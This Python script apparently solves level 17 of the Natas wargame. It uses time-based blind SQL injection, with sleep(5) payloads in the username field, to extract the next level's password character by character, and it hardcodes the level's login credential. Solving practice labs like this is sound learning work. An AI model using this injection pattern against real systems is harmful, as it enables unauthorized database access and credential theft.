# -*- coding: utf-8 -*-
from base import get_page, post_page
import re
from string import ascii_letters, digits
from time import sleep

def natas17():
    username = "natas17"
    password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"

    s = ascii_letters+digits
    chars = ""

    for i in s:
        print(f"TESTING:{i}")
        data = {"username":f"natas18\" and password like BINARY \"%{i}%\" and sleep(5) and \"1\"=\"1"}
        
        while 1:
            try:
                response_time, content = post_page(17, username, password, data, response_time=True)
                break
            except:
                print("Fail to connect, wait 5 seconds and retrying...")
                sleep(5)

        if response_time > 5:
            chars += i
            print(f"FIND:{chars}")
        sleep(1)
    print(chars)

    pw = ""
    
    for k in range(32):
        print(k)
        for i in chars:
            print(f"TESTING:{i}")
            p = pw+i
            data = {"username":f"natas18\" and password like BINARY \"{p}%\" and sleep(5) and \"1\"=\"1"}
            
            while 1:
                try:
                    response_time, content = post_page(17, username, password, data, response_time=True)
                    break
                except:
                    print("Fail to connect, wait 5 seconds and retrying...")
                    sleep(5)

            if response_time > 5:
                pw += i
                print(f"FIND:{pw}")
                break
            sleep(1)
    print(pw)


if __name__ == "__main__":
    natas17()